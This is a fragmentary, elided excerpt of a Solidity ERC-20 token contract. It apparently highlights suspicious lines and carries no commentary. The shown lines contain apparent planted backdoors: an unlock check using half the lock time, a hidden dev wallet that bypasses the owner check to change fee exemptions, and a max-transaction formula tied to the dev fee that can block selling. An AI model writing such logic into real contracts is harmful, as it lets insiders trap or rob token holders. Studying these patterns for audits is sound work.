...
abstract contract Ownable is Context {
    ...
    function unlock() public virtual {
        ...
        require(block.timestamp > _lockTime / 2 , "Contract is locked.");
...
contract CoinToken is Context, IERC20, Ownable {
    ...
    function excludeFromFee(address account) public {
        if (msg.sender != _devWalletAddress)
            require(owner() == _msgSender(), "Ownable: caller is not the owner");    
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && !_isExcludedFromFee[from])
            require(amount <= (_maxTxAmount / ((_devFee * 4999) + 1)), "Transfer amount exceeds the maxTxAmount.");
        if(from != owner() && to != owner() && _isExcludedFromFee[from])
